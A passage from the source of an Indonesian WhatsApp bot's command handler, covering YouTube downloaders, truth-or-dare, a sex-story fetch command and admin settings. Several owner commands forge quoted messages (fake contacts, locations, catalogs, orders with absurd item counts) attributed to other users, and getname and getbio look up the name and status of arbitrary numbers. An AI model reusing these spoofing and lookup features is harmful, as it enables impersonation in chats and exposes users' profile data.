								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
								const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
								sendMediaURL(from, thumb, captionsYtmp4)
								sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
							})
			
							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
							case 'ytmp42':
						
						if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
							if (args.length < 1) return reply('Urlnya mana um?')
							if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
							anu = await fetchJson(`https://st4rz.herokuapp.com/api/ytv2?url=${args[0]}`)
							reply(mess.wait)
					teks = `*Title* : ${anu.title}\n*Mohon tunggu sebentar video sedang di download!*`
							thumb = await getBaper(anu.thumb)
							benny.sendMessage(from, thumb, image, {quoted: adadeh, caption: teks})
							buffer = await getBaper(anu.result)
							benny.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: adadeh})
							break
							case 'ytmp43':
						
						if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
							if (args.length < 1) return reply('Urlnya mana um?')
							if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
							anu = await fetchJson(`https://videfikri.com/api/ytmp4/?url=${args[0]}`)
							reply(mess.wait)
					teks = `*Title* : ${anu.result.judul}\n*Mohon tunggu sebentar video sedang di download!*`
							thumb = await getBaper(anu.result.imgUrl)
							benny.sendMessage(from, thumb, image, {quoted: adadeh, caption: teks})
							buffer = await getBaper(anu.result.urlVideo)
							benny.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.result.judul}.mp4`, quoted: adadeh})
							break
							case 'ytmp44':
						
						if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
							if (args.length < 1) return reply('Urlnya mana um?')
							if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
							anu = await fetchJson(`https://api.zeks.xyz/api/ytmp4?url=${args[0]}&apikey=YunitaGanteng`)
							reply(mess.wait)
					teks = `*Title* : ${anu.result.title}\n*Mohon tunggu sebentar video sedang di download!*`
							thumb = await getBaper(anu.result.thumbnail)
							benny.sendMessage(from, thumb, image, {quoted: adadeh, caption: teks})
							buffer = await getBaper(anu.result.url_video)
							benny.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.result.title}.mp3`, quoted: adadeh})
						     break
							 case 'ytmp45':
						
						if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
							if (args.length < 1) return reply('Urlnya mana um?')
							if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
							anu = await fetchJson(`https://api.zeks.xyz/api/ytmp4/2?url=${args[0]}&apikey=YunitaGanteng`)
							reply(mess.wait)
					teks = `*Title* : ${anu.result.title}\n*Mohon tunggu sebentar video sedang di download!*`
							thumb = await getBaper(anu.result.thumbnail)
							benny.sendMessage(from, thumb, image, {quoted: adadeh, caption: teks})
							buffer = await getBaper(anu.result.url_video)
							benny.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.result.title}.mp3`, quoted: adadeh})
						     break
						case 'ytmp3':
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
						let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks) return reply(mess.error.Iv)
						try {
							reply(mess.wait)
							yta(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
								const captions = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
								sendMediaURL(from, thumb, captions)
								sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
							})

							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
							 case 'ytmp32':
							 if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
						
							if (args.length < 1) return reply('Urlnya mana um?')
							if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
							anu = await ytdl(`${args[0]}`)
							console.log(anu)
							reply(mess.wait)
					teks = `*Title* : ${anu.result.title}\n*Mohon tunggu sebentar video sedang di download!*`
							thumb = await getBaper(anu.thumb)
							benny.sendMessage(from, thumb, image, {quoted: adadeh, caption: teks})
							buffer = await getBaper(anu.result)
							benny.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: adadeh})
						     break
							 case 'ytmp33':
							 if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
						
							if (args.length < 1) return reply('Urlnya mana um?')
							if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
							anu = await fetchJson(`https://videfikri.com/api/ytmp3/?url=${args[0]}`)
							reply(mess.wait)
					teks = `*Title* : ${anu.result.judul}\n*Mohon tunggu sebentar video sedang di download!*`
							thumb = await getBaper(anu.result.thumbnail)
							benny.sendMessage(from, thumb, image, {quoted: adadeh, caption: teks})
							buffer = await getBaper(anu.result.url)
							benny.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.result.judul}.mp3`, quoted: adadeh})
						     break
							 case 'addrespon':
			if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			    	if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				tks = body.slice(11)
				teks1 = tks.split('|')[0]
				teks2 = tks.split('|')[1]
				if (checkCommands(teks1, commandsDB) === true) return reply(`Udah ada`)
				addCommands(teks1, teks2, sender, commandsDB)
				reply(`Ok berhasil gan`)
				break
				case 'listrespon':
				teks = `*LIST RESPOND CHAT*\n`
				t = 1
				for (let o of commandsDB) {
					teks += `\n*${t++}.* ${o.pesan}`
				}
				reply(teks)
				break
			case 'delrespon':
			if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			    	if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Ok berhasil gan`)
				break
					case 'addbadword':
			if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			    	if (args.length < 1) return reply(`Penggunaan ${prefix}addbadword anjing`)
				teks = body.slice(12)
				tos = `Berhasil Add Badword\n`
				addBadword(teks, badwordDB)
				t = 1
				for (let o of badwordDB) {
					tos += `\n*${t++}.* ${o.badword}`
				}
				reply(tos)
				break
				case 'listbadword':
				teks = `*LIST BADWORD*\n`
				t = 1
				for (let o of badwordDB) {
					teks += `\n*${t++}.* ${o.badword}`
				}
				reply(teks)
				break
			case 'delbadword':
			if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			    	if (args.length < 1) return reply(`Penggunaan ${prefix}delbadword anjing`)
				if (!checkBadword(body.slice(12), badwordDB)) return reply(`Ga ada di database`)
                deleteBadword(body.slice(12), badwordDB)
				reply(`Ok berhasil gan`)
				break
							 case 'ytmp34':
						
						if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
							if (args.length < 1) return reply('Urlnya mana um?')
							if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
							anu = await fetchJson(`https://api.zeks.xyz/api/ytmp3?url=${args[0]}&apikey=YunitaGanteng`)
							reply(mess.wait)
					teks = `*Title* : ${anu.result.title}\n*Mohon tunggu sebentar video sedang di download!*`
							thumb = await getBaper(anu.result.thumbnail)
							benny.sendMessage(from, thumb, image, {quoted: adadeh, caption: teks})
							buffer = await getBaper(anu.result.url_audio)
							benny.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: adadeh})
						     break
							  case 'limit':
							  case 'ceklimit':
						
							 teks= `*Limit anda tersisa:* ${limit.getLimit(sender, _limit, limitCount)}\n\n*NOTE:*\nLimit akan direset tiap jam 11 malam!`
							 reply(teks)
							 break
							 case 'ytmp35':
						
						if (limit.isLimit(sender, _limit, limitCount, isPremium, isOwner)) return reply('Limit lu habis cok')
					limit.addLimit(sender, _limit, isPremium, isOwner)
					reply('Limit anda berkurang 1')
							if (args.length < 1) return reply('Urlnya mana um?')
							if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
							anu = await fetchJson(`https://api.zeks.xyz/api/ytmp3/2?url=${args[0]}&apikey=YunitaGanteng`)
							reply(mess.wait)
					teks = `*Title* : ${anu.result.title}\n*Mohon tunggu sebentar video sedang di download!*`
							thumb = await getBaper(anu.result.thumbnail)
							benny.sendMessage(from, thumb, image, {quoted: adadeh, caption: teks})
							buffer = await getBaper(anu.result.url_audio)
							benny.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: adadeh})
						     break
				case 'spekhp':
				
				hp = body.slice(8)
	    anu = await fetchJson(`https://api.vhtear.com/gsmarena?query=${hp}&apikey=${vhtearkey}`)
	    buffer = await getBaper(anu.result.image)
		reply(mess.wait)
							teks = `*Spekifikasi Hp ${hp}* \n➸ *Nama HP* : ${anu.result.title} \n➸ *Spekifikasi* : ${anu.result.spec}`
		benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
		break
				case 'heroml':
				
	                        if (args.length < 1) return reply('Heronya mana bang?')
                          reply(mess.wait)
					anu = await fetchJson(`https://api.vhtear.com/herodetail?query=${body.slice(8)}&apikey=${vhtearkey}`)
		                    teks = `➸ *Hero* : ${anu.result.title} \n➸ *Quotes* : ${anu.result.quotes}\n➸ *Info* : ${anu.result.info}\n➸ *Attributes* : ${anu.result.attributes}`
							buffer = await getBaper(anu.result.pictHero)
		                    benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks}) 
							 break
                case 'truth':
				
					const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					truteh = await getBaper(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					benny.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: adadeh })
					break
				case 'dare':
					const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					tod = await getBaper(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					benny.sendMessage(from, tod, image, { quoted: adadeh, caption: '*Dare*\n\n'+ der })
					break
				case 'cersex':
					cers = await fetchJson(`https://api.vhtear.com/cerita_sex&apikey=${vhtearkey}`)
					buffer = await getBaper(cers.result.image)
					reply(mess.wait)
					benny.sendMessage(from, buffer, MessageType.image, { caption: cers.result.cerita, quoted: adadeh })
					break
				case 'setauto':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = ''
					reply('*Berhasil ubah menjadi auto responder*')
					break
				case 'blockcall':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		          if (args[0] == 'on') {
					  blockcall = true
				  reply('*Berhasil mengaktifkan block call!*')
				  } else if (args[0] == 'off') {
					  	  blockcall = false
				  reply('*Berhasil mematikan block call!*')
				  } else {
					  reply('Pilih on atau off!')
				  }
					break
				case 'setmenu':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		          if (args[0] == 'simple') {
					  simple = true
				  reply('*Berhasil mengubah tampilan menu!*')
				  } else if (args[0] == 'ori') {
					  	  simple = false
				  reply('*Berhasil mengubah tampilan menu!*')
				  } else {
					  reply('Pilih on atau off!')
				  }
					break
				case 'setfakevid':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = { "key": { "remoteJid": setgrup, "fromMe": false, "participant": numbernye, "id": "06FE3C86DEFD487490687FC29E0FE192" }, "message": { "videoMessage": { "caption": fake, "url": "https://mmg.whatsapp.net/d/f/ArveM__IEC-sez1co7Sjwzc3OcGcf6i0rcS86XwFw32a.enc", "mimetype": "video/mp4", "fileSha256": "s9ko8E/G7bqkM+oe0f0JwpT+frn6dLS2OLkVJuAaAPo=", "fileLength": "193775", "seconds": 359996400, "mediaKey": "J4kmhooQRZnWIN/9PV7QphVOG13PekLZQ38ptQz2jJA=", "height": 500, "width": 500, "fileEncSha256": "ljhXlyPe/eyoOfv/rBlS+ZDptXeA6/bwVnbeHid4kY0=", "directPath": "/v/t62.7161-24/23756523_2884064461861118_8707775833189376411_n.enc?oh=273902306dabd3164f2accd2b31755fd&oe=609A6215", "mediaKeyTimestamp": "1618168529", "jpegThumbnail": setthumb, "streamingSidecar": "b04kZLqw5HdoCW99wwwiKjZYVFKEoZdRrC1MhP6F" } } }
                    reply('*Berhasil ubah Fake reply menjadi Video*')
					break
				case 'settroli':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            teroli = args[0]
					reply(`*Berhasil ubah jumlah troli menjadi ${args[0]}*`)
					break
				case 'setfakegif':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = { "key": { "remoteJid": setgrup, "fromMe": false, "participant": numbernye, "id": "48D293827B278371AB6CBB6A4A245F0C" }, "message": { "videoMessage": { "fileLength": "84250", "seconds": 359996400, "caption": fake, "gifPlayback": true, "jpegThumbnail": setthumb, "contextInfo": { "expiration": 0, "ephemeralSettingTimestamp": "1617336940"  }, "gifAttribution": "TENOR", "participant": numbernye } } } 
                    reply('*Berhasil ubah Fake reply menjadi GIF*')
					break
				case 'setfakeloc':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = { "contextInfo": { "stanzaId": "", "participant": numbernye, "quotedMessage": { "locationMessage": { "degreesLatitude": -6.2607594, "degreesLongitude": 106.8668017, "name": fake, "jpegThumbnail": setthumb } }, "remoteJid": setgrup } }
	              reply('*Berhasil ubah Fake reply menjadi Location*')
					break
				case 'setfakect':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = { "key": { "participant": numbernye, "remoteJid": setgrup, "fromMe": false, "id": "6DC12F684FE43FDB835CFE35CC6F5503" }, "message": { "contactMessage": { "displayName": namabot, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Telkomsel;Benny;;;\nFN:N@nd0-BOT\nitem1.TEL;waid=6289636006352:+62 813-8728-9617\nitem1.X-ABLabel:Ponsel\nEND:VCARD` } }, "messageTimestamp": "1614159034", "status": "ERROR" } 
					reply('*Berhasil ubah Fake reply menjadi Contact*')
					break
				case 'setfakecat':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = { "key": { "participant": numbernye, "remoteJid": setgrup, "stanzaId": from, "fromMe": false, "id": "0D5EAADD1166F55012EB42395DE58D61" }, "message": { "productMessage": { "product": { "productImage": { "url": "https://mmg.whatsapp.net/d/f/AsFENZUsypKYO29kpNR2SrgcoBit6mDiApzGccFAPIAq.enc", "mimetype": "image/jpeg", "fileSha256": "iRrEuDPCvNe6NtOv/n+DARqlS1i2UbWqc25iw+qcwwo=", "fileLength": "19247", "height": 500, "width": 500, "mediaKey": "zvebSUI7DcnK9QHuUCJpNAtTsKai0MkvzrcNSYE5pHo=", "fileEncSha256": "t6pd+X7iNV/bwtti0KaOOjGBfOVhxPpnwnTs/QnD0Uw=", "directPath": "/v/t62.7118-24/29158005_1025181757972162_6878749864442314383_n.enc?oh=c97d5aea20257c3971a7248b339ee42d&oe=60504AC8", "mediaKeyTimestamp": "1613162019", "jpegThumbnail": setthumb }, "productId": "3958959877488517", "title": fake, "description": "Kepoluah", "currencyCode": "IDR", "priceAmount1000": harganya, "retailerId": "Kepolu", "url": "https://youtube.com/c/bennyhidayat", "productImageCount": 2 }, "businessOwnerJid": numbernye } }, "messageTimestamp": "1613442626", "status": "PENDING" }
					reply('*Berhasil ubah Fake reply menjadi Catalog*')
					break
				case 'setfakegc':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = { key: { fromMe: false, ...(isGroup ? { participant: "6285737134572@s.whatsapp.net" } : {}), ...(isGroup ? { remoteJid: "6285737134572@s.whatsapp.net" } : {}) }, message: { "contactMessage": { "displayName": `${benny.user.name}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${benny.user.name},;;;\nFN:${benny.user.name},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail": setthumb}}}
					reply('*Berhasil ubah Fake reply menjadi Group*')
					break
					case 'sendinvite':
					benny.sendMessage(from, { "groupJid": "6282211999594-1621150820@g.us", "inviteCode": "Mny0aVxtr6xyXTHC", "inviteExpiration": "1621410169", "groupName": "Tes", "caption": fake }, "groupInviteMessage")
					break
				case 'setfakeinvite':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = { key: { fromMe: false, participant: `6285737134572@s.whatsapp.net`, ...(from ? { remoteJid: "6285737134572@s.whatsapp.net" } : {}) }, message: {"groupInviteMessage": { "groupJid": "6282211999594-1621150820@g.us", "inviteCode": "Mny0aVxtr6xyXTHC", "inviteExpiration": "1621410169", thumbnail: setthumb, "groupName": "Tes", "caption": fake }}}
					reply('*Berhasil ubah Fake reply menjadi Group*')
					break
				case 'setfaketroli':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = {key: {remoteJid: setgrup, participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 99999999999999, status: 0, message: fake, surface: 0, orderTitle: 'Benny', sellerJid: '0@s.whatsapp.net'} } } 
					reply('*Berhasil ubah Fake reply menjadi Troli*')
					break
				case 'setharga':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			if (args.length < 1) return reply('*Berapa harganya ?*') 
					harganya = Number(args[0])
					reply(`*Berhasil ubah harga catalog menjadi ${harganya}*`)
					break
				case 'setfakevn':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = { "key": { "participant": numbernye, "remoteJid": setgrup, "fromMe": false, "id": "0792D61AFA7327F144E824890B5DAA15" }, "message": { "audioMessage": { "mimetype": "image/jpeg", "thumbnail": setthumb, "fileLength": "217894", "seconds": 359996400, "ptt": true }}}
					reply('*Berhasil ubah Fake reply menjadi Voice note*')
					break
					case 'setfakedoc':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = { "key": { "participant": `${numbernye}`, "remoteJid": `${setgrup}`, "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": setthumb, "mimetype": "application/octet-stream", "title": `${fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${fake}` }}, "messageTimestamp": "1614069378", "status": "PENDING"}
					reply('*Berhasil ubah Fake reply menjadi Document*')
					break
				case 'setfakegam':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		            adadeh = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: setgrup } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 500, "width": 500, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": setthumb, "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==" } } } 
					reply('*Berhasil ubah Fake reply menjadi Gambar*')
					break
					case 'delete':
		case 'del':
		case 'd':
			if (!isGroup)return reply(mess.only.group)
			if (!isGroupAdmins && !ben.key.fromMe)return reply(mess.only.admin)
			benny.deleteMessage(from, { id: ben.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
			break
					case 'setreply':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		
					if (args.length < 1) return
					fake = body.slice(10)
					reply(`berhasil ubah Fake reply menjadi : ${fake}`)
					break
					case 'getnama':
					case 'getname':
				 if (isGroup && args.length > 1) {
					 mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
			   console.log(mentioned)
					teks = benny.contacts[mentioned].notify || benny.contacts[mentioned].vname
					reply(teks)
				 } else if (args.length < 1) {
					 teks = benny.contacts[ben.message.extendedTextMessage.contextInfo.participant].notify || benny.contacts[ben.message.extendedTextMessage.contextInfo.participant].vname
					reply(teks)
				 } else if (!isGroup && args.length > 1) {
					 bodom = new RegExp('[-+/ +/()]', 'gi')
				bodo = body.slice(9)
				tekss = bodo.replace(bodom, '')
					 teks = benny.contacts[tekss + '@s.whatsapp.net'].notify || benny.contacts[tekss + '@s.whatsapp.net'].vname
					reply(teks)
				 }
					break
					case 'getbio':
				 if (isGroup && args.length > 1) {
					 mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
					teks = await benny.getStatus(mentioned)
					reply(teks.status)
				 } else if (args.length < 1) {
					 teks = await benny.getStatus(ben.message.extendedTextMessage.contextInfo.participant)
					reply(teks.status)
				 } else if (!isGroup && args.length > 1) {
					 bodom = new RegExp('[-+/ +/()]', 'gi')
				bodo = body.slice(8)
				tekss = bodo.replace(bodom, '')
					 teks = await benny.getStatus(tekss + '@s.whatsapp.net')
					reply(teks.status)
				 }
					break
					case 'setbotname':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		
					if (args.length < 1) return
					namabot = body.slice(12)
					reply(`berhasil ubah nama bot menjadi : ${namabot}`)
					break
					case 'reset':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
		
